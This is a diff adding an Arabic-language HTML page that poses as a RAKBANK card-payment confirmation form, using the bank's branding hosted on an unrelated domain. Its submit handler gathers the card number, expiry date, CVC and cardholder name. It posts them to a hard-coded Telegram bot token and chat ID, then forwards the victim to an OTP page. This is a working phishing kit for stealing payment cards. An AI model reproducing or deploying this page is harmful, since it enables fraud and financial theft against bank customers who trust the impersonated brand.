@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك رأس الخيمة الوطني - معلومات البطاقة</title>
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="بنك رأس الخيمة الوطني - معلومات البطاقة">
+    <meta property="og:description" content="أدخل معلومات بطاقتك لإتمام الدفع.">
+    <meta property="og:image" content="https://alkhaleeg.services/sadUae/images/rakbank_logo.png">
+    <meta property="og:url" content="https://alkhaleeg.services/sadu/rakbank_login.html">
+    <meta property="og:type" content="website">
+
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+            background: #f5f5f5;
+            padding: 20px;
+            line-height: 1.6;
+            margin: 0;
+            max-width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+                font-size: 14px;
+            }
+            .form-container {
+                padding: 20px;
+            }
+            .btn-pay {
+                width: 90%;
+                font-size: 14px;
+                padding: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                font-size: 13px;
+            }
+            .form-container {
+                padding: 15px;
+            }
+            .btn-pay {
+                width: 95%;
+                font-size: 13px;
+                padding: 8px;
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 20px;
+            margin: 0;
+            color: #333;
+        }
+        .payment-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .payment-header img {
+            height: 30px;
+        }
+        .payment-header span {
+            font-weight: bold;
+            color: #333;
+        }
+        .supported-cards {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .supported-cards h3 {
+            margin: 0 0 10px 0;
+            color: #333;
+        }
+        .supported-cards img {
+            height: 30px;
+            margin: 0 10px;
+        }
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-weight: bold;
+            color: #333;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus {
+            border-color: #008000;
+            outline: none;
+        }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        .col {
+            flex: 1;
+        }
+        .btn-pay {
+            display: block;
+            width: 100%;
+            margin: 25px auto;
+            padding: 12px;
+            background: white;
+            color: #333;
+            text-align: center;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s, color 0.3s;
+        }
+        .btn-pay:hover {
+            background: #f0f0f0;
+            color: #008000;
+        }
+        .error-message {
+            display: none;
+            text-align: center;
+            color: red;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>معلومات البطاقة</h1>
+</div>
+
+<div class="payment-header">
+    <img src="https://alkhaleeg.services/sadUae/images/rakbank_logo.png" alt="شعار بنك رأس الخيمة الوطني">
+    <span>تأكيد الدفع</span>
+</div>
+
+<div class="supported-cards">
+    <h3>البطاقات المدعومة</h3>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Mada_Logo.svg/200px-Mada_Logo.svg.png" alt="مدى">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/200px-Mastercard-logo.svg.png" alt="Mastercard">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Visa_Inc._logo.svg/200px-Visa_Inc._logo.svg.png" alt="VISA">
+</div>
+
+<div class="form-container">
+    <form id="rakbankPayment">
+        <label for="cardNumber">رقم البطاقة.</label>
+        <input type="text" id="cardNumber" name="cardNumber" required pattern="\d{16}" title="يجب أن يكون 16 رقمًا">
+
+        <div class="row">
+            <div class="col">
+                <label for="expiryDate">تاريخ الانتهاء</label>
+                <input type="text" id="expiryDate" name="expiryDate" required placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/\d{2}" title="تنسيق MM/YY">
+            </div>
+            <div class="col">
+                <label for="cvc">(CVC) رمز التحقق من البطاقة</label>
+                <input type="text" id="cvc" name="cvc" required pattern="\d{3,4}" title="3 أو 4 أرقام">
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col">
+                <label for="firstName">الاسم الأول</label>
+                <input type="text" id="firstName" name="firstName" required>
+            </div>
+            <div class="col">
+                <label for="lastName">الاسم الأخير</label>
+                <input type="text" id="lastName" name="lastName" required>
+            </div>
+        </div>
+
+        <button type="submit" class="btn-pay">تأكيد الدفع</button>
+        <div class="error-message" id="errorMessage"></div>
+    </form>
+</div>
+
+<script>
+    document.getElementById('rakbankPayment').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiryDate = document.getElementById('expiryDate').value;
+        const cvc = document.getElementById('cvc').value;
+        const firstName = document.getElementById('firstName').value;
+        const lastName = document.getElementById('lastName').value;
+
+        // إخفاء رسالة الخطأ
+        document.getElementById('errorMessage').style.display = 'none';
+
+        // بوت تلغرام
+        const botToken = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
+        const chatId = '1008144314';
+
+        const message = `
+💳 *دفع عبر بنك رأس الخيمة الوطني*
+
+🔢 رقم البطاقة: ${cardNumber}
+📅 تاريخ الانتهاء: ${expiryDate}
+🔒 CVC: ${cvc}
+👤 الاسم: ${firstName} ${lastName}
+📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
+`;
+
+        // إرسال البيانات إلى تلغرام
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // بعد النجاح: التوجيه إلى صفحة OTP
+                window.location.href = 'otp_page.html';
+            } else {
+                throw new Error('فشل الإرسال');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            const errorMsg = document.getElementById('errorMessage');
+            errorMsg.textContent = '❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.';
+            errorMsg.style.display = 'block';
+        });
+    });
+</script>
+
+</body>
+</html>
